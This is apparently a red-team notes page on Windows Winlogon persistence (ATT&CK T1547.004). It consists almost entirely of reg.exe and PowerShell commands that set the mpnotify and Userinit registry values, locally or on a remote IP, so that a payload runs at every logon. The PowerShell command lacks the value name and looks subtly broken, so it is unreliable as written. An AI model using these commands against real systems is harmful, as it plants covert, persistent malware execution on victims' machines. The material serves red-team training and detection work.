---
author(s):
  - Userware
tags:
  - post-exploitation
  - maintaining-access
  - persistence
  - living-off-the-land
  - T1547-004
  - windows
---
# WinLogon

## 01 - Command Prompt

```
C:\> reg.exe query "[\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v mpnotify
```

```
C:\> reg.exe add "[\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /t REG_SZ /v mpnotify /d "C:\path\to\payload.exe" /f
```

## 02 - PowerShell

```
PS C:\> Set-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Type String -Value "C:\Windows\system32\userinit.exe, C:\path\to\payload.exe" -Force
```

---
## References

### Backlinks

- [[07 - Tactics & Techniques & Procedures Phases/F - Post Exploitation/0x07 - Maintaining Access/Persistence/Windows/Host Persistence/Backdoors/Startup/Malware Development/Helpers]]

### Persistence Info

- [Persistence Info: MPNotify](https://persistence-info.github.io/Data/mpnotify.html)

### Red Team Notes

- [Red Team Notes: Windows Logon Helper](https://www.ired.team/offensive-security/persistence/windows-logon-helper)